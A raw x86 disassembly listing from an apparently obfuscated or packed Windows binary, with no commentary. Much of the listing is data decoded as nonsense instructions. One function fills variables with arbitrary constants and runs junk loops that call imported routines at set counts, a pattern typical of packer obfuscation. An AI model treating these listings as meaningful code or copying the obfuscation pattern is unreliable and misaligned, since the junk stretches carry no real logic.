  40d310:	jp     0x40d302
  40d312:	scas   eax,DWORD PTR es:[edi]
  40d313:	fdiv   DWORD PTR [ebp+0x580c7b1b]
  40d319:	das    
  40d31a:	pop    DWORD PTR ds:0x1480b4d2
  40d320:	stos   DWORD PTR es:[edi],eax
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	add    al,0xda
  40d33a:	out    0xa4,eax
  40d33c:	mov    al,0x97
  40d33e:	jle    0x40d3be
  40d340:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d344:	rcr    DWORD PTR [edi+0x6fed218f],1
  40d34a:	inc    esi
  40d34b:	cmp    BYTE PTR [ebx+0x5e8f00f],al
  40d351:	ficomp DWORD PTR [eax]
  40d353:	stc    
  40d354:	adc    eax,0x6e0b910e
  40d359:	sub    BYTE PTR [ebx],dl
  40d35b:	pcmpgtw mm5,QWORD PTR [esi]
  40d35e:	push   di
  40d360:	sar    BYTE PTR ds:0x467043d8,0xb1
  40d367:	push   ecx
  40d368:	lods   eax,DWORD PTR ds:[esi]
  40d369:	inc    BYTE PTR [edx-0x6d253154]
  40d36f:	inc    eax
  40d370:	(bad)  
  40d372:	push   ecx
  40d373:	fisttp WORD PTR [eax]
  40d375:	or     cl,BYTE PTR [edx+0x6cb12ee0]
  40d37b:	pop    esi
  40d37c:	cmp    DWORD PTR [eax],esp
  40d37e:	ret    0x4e12
  40d381:	mov    bl,0x1b
  40d383:	inc    edx
  40d384:	lods   al,BYTE PTR ds:[esi]
  40d385:	and    bh,BYTE PTR [ecx-0x2ca3ffb9]
  40d38b:	loop   0x40d3fa
  40d38d:	ret    0x4c81
  40d390:	cmp    ah,BYTE PTR [eax]
  40d392:	mov    dh,0xf
  40d394:	cmp    BYTE PTR [ebx],dl
  40d396:	inc    edx
  40d397:	push   ds
  40d398:	sub    ecx,edx
  40d39a:	fucomip st,st(7)
  40d39c:	push   ss
  40d39d:	jbe    0x40d3b1
  40d39f:	int    0xaf
  40d3a1:	and    DWORD PTR [ecx-0xa89c026],esp
  40d3a7:	mov    eax,ds:0x92b04433
  40d3ac:	addr16 loop 0x40d3b6
  40d3af:	sub    bh,BYTE PTR [ebp+0x1c]
  40d3b2:	(bad)
  40d3b6:	rcr    BYTE PTR [esi-0xc],1
  40d3b9:	mov    ch,0x1c
  40d3bb:	cmp    bh,ch
  40d3bd:	mov    cs,WORD PTR [esi]
  40d3bf:	jmp    0x40d3aa
  40d3c1:	ja     0x40d3af
  40d3c3:	cmp    edx,DWORD PTR ss:[edx-0xad0cd11]
  40d3ca:	sub    BYTE PTR [eax-0x2d19224e],0xc1
  40d3d1:	xor    DWORD PTR [esi+0x17],0xffffff96
  40d3d5:	aad    0xd4
  40d3d7:	xchg   ecx,eax
  40d3d8:	call   0x94ec1907
  40d3dd:	adc    al,0x7c
  40d3df:	out    dx,al
  40d3e0:	adc    edx,esp
  40d3e2:	test   DWORD PTR [ebp+ebx*2-0xc3259f2],edi
  40d3e9:	pop    ss
  40d3ea:	mov    al,ds:0xaf4ae25
  40d3ef:	jns    0x40d46f
  40d3f1:	enter  0x76ba,0x7c
  40d3f5:	mov    esi,0x68d65514
  40d3fa:	es pop ds
  40d3fc:	outs   dx,DWORD PTR ds:[esi]
  40d3fd:	xchg   edi,eax
  40d3fe:	cli    
  40d3ff:	or     BYTE PTR [edx+0x619f07c1],bl
  40d405:	mov    WORD PTR [ebp+0x31e85c45],es
  40d40b:	and    ecx,esi
  40d40d:	pop    ebx
  40d40e:	cdq    
  40d40f:	inc    edx
  40d410:	cmp    eax,0x3c427cb3
  40d415:	aam    0x8d
  40d417:	push   eax
  40d418:	dec    esi
  40d419:	adc    al,0x52
  40d41b:	mov    ds:0xb5426896,al
  40d420:	ins    BYTE PTR es:[edi],dx
  40d421:	imul   edi,DWORD PTR [edx-0x6d],0xd
  40d425:	into   
  40d426:	imul   edx,DWORD PTR [ebx+eax*1-0x6da5bf1],0x76
  40d42e:	(bad)  
  40d42f:	cmp    al,0x6a
  40d431:	sub    al,BYTE PTR [ecx-0xc4280f9]
  40d437:	or     cl,BYTE PTR [esi-0x3ff6264a]
  40d43d:	sub    edi,DWORD PTR [edx+0x24ca98a5]
  40d443:	test   eax,0xe882280f
  40d448:	lds    esp,FWORD PTR [eax+0x63]
  40d44b:	add    BYTE PTR [ebx+0x15],0x43
  40d44f:	inc    ebx
  40d450:	js     0x40d40c
  40d452:	fucomip st,st(2)
  40d454:	cmp    BYTE PTR ds:0xbcde57d3,bl
  40d45a:	add    ebx,edx
  40d45c:	test   al,0x3f
  40d45e:	or     esp,esp
  40d460:	mov    ch,0x4f
  40d462:	data16 mov WORD PTR [ecx],ss
  40d465:	inc    eax
  40d466:	add    bl,ch
  40d468:	shl    BYTE PTR [ecx-0x541b4324],1
  40d46e:	add    BYTE PTR [edx],ch
  40d470:	aaa    
  40d471:	daa    
  40d472:	rcl    bh,0x32
  40d475:	xchg   ebx,eax
  40d476:	test   BYTE PTR [eax+0x3e],dl
  40d479:	sub    al,0x9c
  40d47b:	ss iret 
  40d47d:	pop    ss
  40d47e:	sbb    bl,al
  40d480:	inc    eax
  40d481:	add    bh,al
  40d483:	push   cs
  40d484:	icebp  
  40d485:	cmp    dh,BYTE PTR ds:0x6f9a918c
  40d48b:	mov    ecx,0x6761ec5b
  40d490:	pop    ebx
  40d491:	sbb    ch,BYTE PTR [esi+ebp*1-0x1]
  40d495:	dec    ebp
  40d496:	mov    ch,0xf9
  40d498:	addr16 nop
  40d49a:	jbe    0x40d495
  40d49c:	loope  0x40d508
  40d49e:	sbb    eax,0xc8819e0a
  40d4a3:	ret    
  40d4a4:	iret   
  40d4a5:	sub    al,0x14
  40d4a7:	sbb    eax,DWORD PTR [ebp-0xc04a003]
  40d4ad:	push   edi
  40d4ae:	fistp  DWORD PTR [eax]
  40d4b0:	ficom  DWORD PTR ds:0x701dfca2
  40d4b6:	push   esp
  40d4b7:	(bad)  
  40d4b8:	and    BYTE PTR [edx-0x44],al
  40d4bb:	fdiv   st(0),st
  40d4bd:	mov    al,ds:0xfa6dcd8b
  40d4c2:	ja     0x40d479
  40d4c4:	push   ss
  40d4c5:	out    dx,al
  40d4c6:	fsubr  DWORD PTR [ecx+0x2ecf133e]
  40d4cc:	adc    dh,BYTE PTR [edi-0x92ff3a4]
  40d4d2:	in     al,0xf0
  40d4d4:	or     bh,BYTE PTR [ebp-0x33]
  40d4d7:	loop   0x40d4b5
  40d4d9:	xor    ah,BYTE PTR [edi+0x50007af9]
  40d4df:	xchg   ebx,eax
  40d4e0:	xchg   ecx,eax
  40d4e1:	aas    
  40d4e2:	lods   al,BYTE PTR ds:[esi]
  40d4e3:	shl    DWORD PTR [ecx+ebx*2+0x1],cl
  40d4e7:	rcr    BYTE PTR [eax-0x1],0x6
  40d4eb:	sbb    DWORD PTR [ecx-0x3a23607],0xffffffb0
  40d4f2:	mov    WORD PTR [edx+0x67],?
  40d4f5:	rol    DWORD PTR [ecx-0x26969403],cl
  40d4fb:	aad    0x65
  40d4fd:	sbb    BYTE PTR [esi-0x2c96424a],dl
  40d503:	loopne 0x40d51a
  40d505:	ds nop
  40d507:	fidiv  WORD PTR [ecx+0x2e]
  40d50a:	add    DWORD PTR [ebx+0xeeaab7b],edx
  40d510:	sahf   
  40d511:	cmp    eax,0x9d0b8671
  40d516:	call   0xcdd2ec3
  40d51b:	jae    0x40d53e
  40d51d:	ss js  0x40d4c9
  40d520:	push   eax
  40d521:	push   edx
  40d522:	les    edi,FWORD PTR [edx]
  40d524:	sahf   
  40d525:	bnd jbe 0x40d4cb
  40d528:	pop    eax
  40d529:	icebp  
  40d52a:	xor    BYTE PTR [edi],ch
  40d52c:	in     al,dx
  40d52d:	mov    al,ss:0x5ede0137
  40d533:	repnz inc edx
  40d535:	add    BYTE PTR [esi+0x447bb542],dh
  40d53b:	mov    bh,0xab
  40d53d:	mov    ch,0x3b
  40d53f:	addr16 push ds
  40d541:	lods   al,BYTE PTR ds:[esi]
  40d542:	nop
  40d543:	int    0x11
  40d545:	and    eax,0x96ff5a07
  40d54a:	lea    edx,[ebx+0x77]
  40d54d:	retf   
  40d54e:	out    dx,eax
  40d54f:	out    dx,eax
  40d550:	arpl   WORD PTR [ecx+0x4f],bx
  40d553:	fsubr  QWORD PTR [eax-0x2d1e8de0]
  40d559:	stc    
  40d55a:	jp     0x40d5b3
  40d55c:	pop    eax
  40d55d:	test   DWORD PTR [edi],0xf5298a57
  40d563:	lea    eax,[ebp-0x50]
  40d566:	mov    dh,0x83
  40d568:	mov    al,ds:0x66d3e42a
  40d56d:	cmc    
  40d56e:	mov    ds,WORD PTR [eax+edx*8+0x11]
  40d572:	pushf  
  40d573:	sub    al,0x2e
  40d575:	mov    bl,BYTE PTR [esi-0x27]
  40d578:	ret    0x1b2e
  40d57b:	jge    0x40d52b
  40d57d:	shr    BYTE PTR [ecx+0x34fac46a],1
  40d583:	mov    esp,DWORD PTR [ebp+0x5b]
  40d586:	mov    DWORD PTR [ebx+0x343cf84],esi
  40d58c:	sbb    al,0x1a
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x433723,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433717,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43371b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x433727,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x433763
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43371b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x4337a7,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x4337af,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x4336db,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x43375b,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433797,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433797
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433797,edx
  40d64f:	cmp    DWORD PTR ds:0x433797,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433797,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x4336e3,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x4336e3
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x4336e3,edx
  40d68b:	cmp    DWORD PTR ds:0x4336e3,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x4337d3
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x4336e3,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x4336e7
  40d6b7:	add    eax,DWORD PTR ds:0x43371b
  40d6bd:	mov    ds:0x4336e7,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x7ca0482a
  40d6f9:	dec    edx
  40d6fa:	jl     0x40d778
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d773
  40d705:	inc    esp
  40d706:	mov    eax,0xebb57975
  40d70b:	xchg   esp,eax
  40d70c:	xchg   ebx,eax
  40d70d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d70e:	test   eax,0xb4804dc0
  40d713:	add    eax,0x367a2ca4
  40d718:	lea    edi,[ecx+0x26]
  40d71b:	xchg   edx,eax
  40d71c:	sub    BYTE PTR [ebp+0x3e],0xf6
  40d720:	(bad)  
  40d722:	aas    
  40d723:	ret    0xf1b7
  40d726:	mov    esp,0xad708b28
  40d72b:	mov    ebp,0xb512ce05
  40d730:	sbb    bl,BYTE PTR ds:0xd8a09c2e
  40d736:	adc    ah,BYTE PTR [edx]
  40d738:	leave  
  40d739:	push   cs
  40d73a:	push   ebx
  40d73b:	call   0x39f8:0x4aa3d54f
  40d742:	add    esi,DWORD PTR [edx+0x74]
  40d745:	clc    
  40d746:	cmp    eax,0x16f16675
  40d74b:	loopne 0x40d6e6
  40d74d:	push   0x2b
  40d74f:	inc    ecx
  40d750:	call   0x9523b181
  40d755:	loopne 0x40d729
  40d757:	mov    bl,0x34
  40d759:	scas   al,BYTE PTR es:[edi]
  40d75a:	popa   
  40d75b:	out    dx,eax
  40d75c:	push   ss
  40d75d:	add    al,0x17
  40d75f:	inc    edi
  40d760:	add    eax,0x915cadce
  40d765:	fs xchg ebx,eax
  40d767:	shl    DWORD PTR [eax],0x3a
  40d76a:	mov    bl,0xc0
  40d76c:	xchg   edx,eax
  40d76d:	cmp    DWORD PTR [eax-0x2c],eax
  40d770:	dec    eax
  40d771:	mov    edx,0x2a4d6769
  40d776:	xlat   BYTE PTR es:[ebx]
  40d778:	pusha  
  40d779:	ret    
  40d77a:	int    0x51
  40d77c:	(bad)  
  40d77d:	shl    DWORD PTR [ecx-0x44],cl
  40d780:	pop    ebp
  40d781:	xlat   BYTE PTR ds:[ebx]
  40d782:	je     0x40d755
  40d784:	inc    esp
  40d785:	jns    0x40d772
  40d787:	cmp    bl,0x15
  40d78a:	mov    ds:0xa8552e57,al
  40d78f:	mov    edx,0x543df36
  40d794:	call   0xd63b:0x8fa312f3
  40d79b:	lods   al,BYTE PTR ds:[esi]
  40d79c:	or     eax,esp
  40d79e:	jmp    0xc8bc5499
  40d7a3:	lahf   
  40d7a4:	sbb    ah,cl
  40d7a6:	mov    edx,0x4b8fd1da
  40d7ab:	outs   dx,DWORD PTR ds:[esi]
  40d7ac:	inc    esp
  40d7ad:	and    DWORD PTR [ecx],esp
  40d7af:	sub    BYTE PTR [eax-0x4c1d924c],ah
  40d7b5:	inc    eax
  40d7b6:	loop   0x40d752
  40d7b8:	inc    DWORD PTR [esi]
  40d7ba:	mov    BYTE PTR [eax],ah
  40d7bc:	mov    eax,0xd078ac2b
  40d7c1:	ret    
  40d7c2:	or     ecx,DWORD PTR [ebx]
  40d7c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7c5:	mov    ds:0xb79cefd4,al
  40d7ca:	xor    ebx,DWORD PTR [ecx]
  40d7cc:	aas    
  40d7cd:	push   ebp
  40d7ce:	mov    eax,0x1762f623
  40d7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7d4:	aam    0x6e
  40d7d6:	(bad)  
  40d7d7:	out    0x63,al
  40d7d9:	nop
  40d7da:	xor    al,0xc8
  40d7dc:	and    edi,DWORD PTR [ebp-0x7c]
  40d7df:	ficom  DWORD PTR [edx+0x41]
  40d7e2:	bnd jne 0x40d7f6
  40d7e5:	or     al,0xe1
  40d7e7:	call   0x56e97067
  40d7ec:	(bad)  
  40d7ed:	adc    DWORD PTR [esi-0x59],edx
  40d7f0:	fiadd  WORD PTR [edi-0x1f8763d1]
  40d7f6:	push   es
  40d7f7:	mov    edi,0x67200399
  40d7fc:	(bad)  
  40d7fe:	in     al,0x62
  40d800:	jno    0x40d868
  40d802:	pop    es
  40d803:	scas   al,BYTE PTR es:[edi]
  40d804:	inc    ecx
  40d805:	fcomp  QWORD PTR [ebx]
  40d807:	std    
  40d808:	aaa    
  40d809:	leave  
  40d80a:	xor    BYTE PTR [edx-0x61],bh
  40d80d:	(bad)  
  40d80e:	cmc    
  40d80f:	imul   esp,ebp,0xffffffcf
  40d812:	scas   al,BYTE PTR es:[edi]
  40d813:	jle    0x40d85b
  40d815:	idiv   DWORD PTR [eax-0x3b]
  40d818:	inc    edi
  40d819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d81b:	bound  edi,QWORD PTR [edx+eax*8-0x4e]
  40d81f:	sar    bl,1
  40d821:	lods   al,BYTE PTR ds:[esi]
  40d822:	push   esp
  40d823:	aas    
  40d824:	out    0xf4,eax
  40d826:	cli    
  40d827:	dec    edx
  40d828:	and    al,0x83
  40d82a:	imul   esi,DWORD PTR [ebx+0xe],0x9000c70e
  40d831:	push   ebp
  40d832:	mov    bh,0x4b
  40d834:	imul   edi,DWORD PTR [ecx],0x93896006
  40d83a:	push   ebp
  40d83b:	cmp    esp,eax
  40d83d:	call   0x137bff6
  40d842:	mov    bl,BYTE PTR [edx+0x3]
  40d845:	pop    esp
  40d846:	loop   0x40d8b4
  40d848:	call   0xf7919a5d
  40d84d:	jnp    0x40d813
  40d84f:	call   0xaa7cd0c3
  40d854:	iret   
  40d855:	xchg   ebp,eax
  40d856:	mov    bl,BYTE PTR [eax]
  40d858:	sub    ebp,DWORD PTR [eax-0x14]
  40d85b:	test   al,cl
  40d85d:	jl     0x40d816
  40d85f:	sub    edi,DWORD PTR [edi+0x36507bce]
  40d865:	dec    edi
  40d866:	lods   al,BYTE PTR ds:[esi]
  40d867:	sbb    BYTE PTR ds:0xef50cb20,dl
  40d86d:	xchg   edi,eax
  40d86e:	sub    al,0xce
  40d870:	mov    ebp,DWORD PTR [edx-0x42]
  40d873:	xchg   esp,eax
  40d874:	or     bl,BYTE PTR [eax+0x4e427cc1]
  40d87a:	mov    ds:0xcd14b5b0,al
  40d87f:	cmc    
  40d880:	mov    dh,BYTE PTR [ecx-0x1b]
  40d883:	add    dl,bh
  40d885:	mov    al,ds:0x9bd6732e
  40d88a:	pop    ebx
  40d88b:	bound  esp,QWORD PTR [eax+eiz*4-0x4366e624]
  40d892:	cmp    DWORD PTR [eax-0xadd1542],edi
  40d898:	or     eax,0x9b3760c2
  40d89d:	xchg   esp,eax
  40d89e:	(bad)  
  40d89f:	test   esp,0x2fa9d703
  40d8a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8a6:	mov    al,0x63
  40d8a8:	cmp    ebx,DWORD PTR [ecx+0x6e]
  40d8ab:	xchg   esp,eax
  40d8ac:	lods   al,BYTE PTR ds:[esi]
  40d8ad:	ret    
  40d8ae:	in     eax,0x23
  40d8b0:	call   0x49dc0f5a
  40d8b5:	std    
  40d8b6:	jmp    0xbd65:0x225e71cf
  40d8bd:	call   0xcc7e359f
  40d8c2:	out    dx,eax
  40d8c3:	loopne 0x40d8be
  40d8c5:	jo     0x40d8d3
  40d8c7:	data16 and BYTE PTR [esi+0x2d2b9de4],cl
  40d8ce:	mov    edx,0xe05365cb
  40d8d3:	push   edi
  40d8d4:	sub    al,0x30
  40d8d6:	aaa    
  40d8d7:	aad    0xae
  40d8d9:	fimul  WORD PTR [ebp-0x5ce2e22e]
  40d8df:	repz leave 
  40d8e1:	imul   BYTE PTR [ecx]
  40d8e3:	add    dh,BYTE PTR [ecx]
  40d8e5:	or     esi,0x7074cacd
  40d8eb:	fstp   TBYTE PTR [edx+ebp*1+0x72]
  40d8ef:	jb     0x40d887
  40d8f1:	cmp    al,0xa0
  40d8f3:	out    dx,al
  40d8f4:	cmp    DWORD PTR [edi],edx
  40d8f6:	mov    fs,WORD PTR [edi+0x2b61794b]
  40d8fc:	adc    eax,0xd841c9f4
  40d901:	push   ds
  40d902:	push   ecx
  40d903:	pop    edi
  40d904:	mov    DWORD PTR [edi+ebp*8+0x15],edx
  40d908:	leave  
  40d909:	mov    cl,0xd7
  40d90b:	out    0xb1,eax
  40d90d:	popf   
  40d90e:	mov    eax,ds:0xd32885c1
  40d913:	xchg   ecx,eax
  40d914:	adc    eax,DWORD PTR [ebx-0x2d]
  40d917:	stos   BYTE PTR es:[edi],al
  40d918:	push   edi
  40d919:	add    al,0x9
  40d91b:	push   esp
  40d91c:	add    esi,DWORD PTR [edi]
  40d91e:	arpl   sp,dx
  40d920:	fs ret 
  40d922:	scas   al,BYTE PTR es:[edi]
  40d923:	cld    
  40d924:	retf   0x3124
  40d927:	jno    0x40d976
  40d929:	(bad)  
  40d92a:	push   esi
  40d92b:	pop    ebx
  40d92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d92d:	inc    ecx
  40d92e:	call   0xb0d0305c
  40d933:	loop   0x40d99f
  40d935:	and    DWORD PTR [eax+ebp*1],0xffffffbc
  40d939:	pop    eax
  40d93a:	cmp    edx,DWORD PTR [edi]
  40d93c:	imul   esi,DWORD PTR [ecx],0xffffffa9
  40d93f:	aaa    
  40d940:	int    0x31
  40d942:	push   ds
  40d943:	mov    eax,ds:0x458b0189
  40d948:	clc    
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x6f2b51ed
  40d96a:	fdivr  QWORD PTR [ebp+0x7e903a2c]
  40d970:	jle    0x40d9b0
  40d972:	jl     0x40d9f2
  40d974:	jle    0x40d97c
  40d976:	in     eax,dx
  40d977:	loope  0x40d9db
  40d979:	and    cl,BYTE PTR [edx]
  40d97b:	jno    0x40d9b2
  40d97d:	scas   al,BYTE PTR es:[edi]
  40d97e:	cmp    al,0x12
  40d980:	pop    eax
  40d981:	or     DWORD PTR [eax],ebx
  40d983:	pop    edx
  40d984:	mov    cl,0x48
  40d986:	push   cs
  40d987:	cmp    DWORD PTR [eax-0x17],eax
  40d98a:	jo     0x40d9f9
  40d98c:	push   0xf88fdf4d
  40d991:	call   0x6bbb:0x203236d
  40d998:	or     DWORD PTR [ebp+0x5840e707],edi
  40d99e:	add    ah,BYTE PTR [edi]
  40d9a0:	lds    edx,FWORD PTR [ebp+0x4b]
  40d9a3:	inc    esp
  40d9a4:	test   DWORD PTR fs:[ebx+0x604654e1],esi
  40d9ab:	mov    edi,0xf81fa6d8
  40d9b0:	sbb    al,0x82
  40d9b2:	or     DWORD PTR [ebp+0x71],edi
  40d9b5:	lods   eax,DWORD PTR ds:[esi]
  40d9b6:	pop    ds
  40d9b7:	int3   
  40d9b8:	nop
  40d9b9:	mov    ds:0x4365f293,eax
  40d9be:	out    dx,eax
  40d9bf:	jg     0x40d9f0
  40d9c1:	mov    cl,ah
  40d9c3:	gs pop edi
  40d9c5:	ror    eax,cl
  40d9c7:	cld    
  40d9c8:	les    ecx,FWORD PTR [edi+0x6a]
  40d9cb:	lds    ebx,FWORD PTR [eax+0x66]
  40d9ce:	push   ecx
  40d9cf:	and    al,0x6b
  40d9d1:	lock cld 
  40d9d3:	stos   DWORD PTR es:[edi],eax
  40d9d4:	push   ecx
  40d9d5:	sub    edx,DWORD PTR [ebx+0x1f4adcb6]
  40d9db:	sbb    ah,BYTE PTR [ebp+0x1e925bab]
  40d9e1:	adc    eax,DWORD PTR [edx-0x57dab93]
  40d9e7:	loop   0x40da60
  40d9e9:	jae    0x40d9ed
  40d9eb:	xor    bh,BYTE PTR [edx]
  40d9ed:	cs ja  0x40da4e
  40d9f0:	mov    dl,al
  40d9f2:	fwait
  40d9f3:	cli    
  40d9f4:	sahf   
  40d9f5:	inc    esp
  40d9f6:	xchg   esp,eax
  40d9f7:	lds    edi,FWORD PTR [ecx-0x469914a]
  40d9fd:	dec    eax
  40d9fe:	psllw  mm6,QWORD PTR [ecx+0x7ae4777e]
  40da05:	sub    eax,0xe4e83edd
  40da0a:	push   edx
  40da0b:	add    esi,DWORD PTR gs:[edx]
  40da0e:	dec    ebx
  40da0f:	inc    edx
  40da10:	outs   dx,BYTE PTR ds:[esi]
  40da11:	mov    eax,ebp
  40da13:	out    0xa7,eax
  40da15:	adc    al,0x4e
  40da17:	lods   eax,DWORD PTR ds:[esi]
  40da18:	adc    ebx,edx
  40da1a:	icebp  
  40da1b:	sub    ebp,DWORD PTR [eax+eax*2+0x5b]
  40da1f:	sahf   
  40da20:	sbb    DWORD PTR [eax+0x168043bb],edi
  40da26:	pop    ss
  40da27:	push   ds
  40da28:	inc    esi
  40da29:	lea    edi,[edi]
  40da2b:	push   es
  40da2c:	mov    bl,0xcb
  40da2e:	popa   
  40da2f:	jl     0x40d9ee
  40da31:	aam    0x8c
  40da33:	mov    ecx,0x24c53ca1
  40da38:	push   ss
  40da39:	mov    edx,0xf4eaac68
  40da3e:	lea    ebp,ds:0x898db777
  40da44:	(bad)  
  40da45:	shl    BYTE PTR ds:0x91720baf,1
  40da4b:	mov    dl,0x80
  40da4d:	pop    edx
  40da4e:	add    al,0x4c
  40da50:	adc    ecx,edi
  40da52:	push   esp
  40da53:	sar    DWORD PTR [ebp+0x28a0c167],0x3c
  40da5a:	sbb    DWORD PTR [ecx],edx
  40da5c:	inc    esi
  40da5d:	aaa    
  40da5e:	dec    ebx
  40da5f:	sar    BYTE PTR [ebx+ecx*4],1
  40da62:	mov    WORD PTR [eax],cs
  40da64:	jg     0x40dacc
  40da66:	fisub  DWORD PTR [ebp+0x5]
  40da69:	aaa    
  40da6a:	mov    esp,0x857dcb11
  40da6f:	jae    0x40da32
  40da71:	rcl    DWORD PTR [ecx+0x67],0x1f
  40da75:	push   ss
  40da76:	inc    ebp
  40da77:	pop    ebx
  40da78:	or     cl,dl
  40da7a:	push   ds
  40da7b:	sub    cl,ch
  40da7d:	ja     0x40da40
  40da7f:	stos   DWORD PTR es:[edi],eax
  40da80:	or     cl,0xc
  40da83:	inc    DWORD PTR [esi+0x1ddf6dbc]
  40da89:	aaa    
  40da8a:	jns    0x40dafd
  40da8c:	fld    DWORD PTR [esi]
  40da8e:	mov    cl,0xb3
  40da90:	or     eax,0x5c8125ba
  40da95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da96:	imul   esp,DWORD PTR [edx+edx*8+0x27a1710],0x7a
  40da9e:	mov    BYTE PTR [ebx+0x9b2effe],bl
  40daa4:	jnp    0x40da28
  40daa6:	and    DWORD PTR [eax],0x47
  40daa9:	nop
  40daaa:	xor    al,0xd8
  40daac:	jns    0x40db0d
  40daae:	fcmovnb st,st(5)
  40dab0:	and    BYTE PTR [esp+edi*8-0x32],ah
  40dab4:	mov    ds:0x5fb847bd,al
  40dab9:	mov    bl,0xfa
  40dabb:	sbb    al,0x81
  40dabe:	inc    esi
  40dabf:	fs xchg esi,eax
  40dac1:	mov    esp,0xd2a898b0
  40dac6:	cld    
  40dac7:	stos   BYTE PTR es:[edi],al
  40dac8:	sti    
  40dac9:	rcr    BYTE PTR [edi],cl
  40dacb:	dec    edi
  40dacc:	out    0xf6,al
  40dace:	cmp    ebx,DWORD PTR [eax]
  40dad0:	dec    eax
  40dad1:	add    BYTE PTR [edx-0x5686114a],bh
  40dad7:	outs   dx,BYTE PTR ds:[esi]
  40dad8:	adc    DWORD PTR [edi+eiz*8-0x7859eaa4],ebp
  40dadf:	sub    cl,BYTE PTR [edi+eax*4-0x4941f459]
  40dae6:	dec    esi
  40dae7:	(bad)  
  40dae8:	call   0xbad1e394
  40daed:	push   ecx
  40daee:	jmp    0x540d9960
  40daf3:	xchg   BYTE PTR [esi],dl
  40daf5:	mov    ebp,0x3d923a5c
  40dafa:	cmc    
  40dafb:	hlt    
  40dafc:	push   es
  40dafd:	add    bl,BYTE PTR [edx-0x6afe5322]
  40db03:	in     al,0x6a
  40db05:	pop    edx
  40db06:	mov    bl,0xe6
  40db08:	xor    esp,DWORD PTR [ebx-0x432be0db]
  40db0e:	dec    eax
  40db0f:	sub    al,BYTE PTR [edi]
  40db11:	jmp    0x40daf4
  40db13:	aaa    
  40db14:	xlat   BYTE PTR ds:[ebx]
  40db15:	inc    ecx
  40db16:	or     DWORD PTR [edx-0x1a307574],ebx
  40db1c:	icebp  
  40db1d:	inc    esp
  40db1e:	mov    DWORD PTR [edi+eax*4-0x2ffb9d6f],0x8b60f210
  40db29:	(bad)  
  40db2a:	sub    eax,0x60d029b6
  40db2f:	daa    
  40db30:	pop    eax
  40db31:	arpl   dx,bp
  40db33:	pop    ss
  40db34:	test   al,0xbb
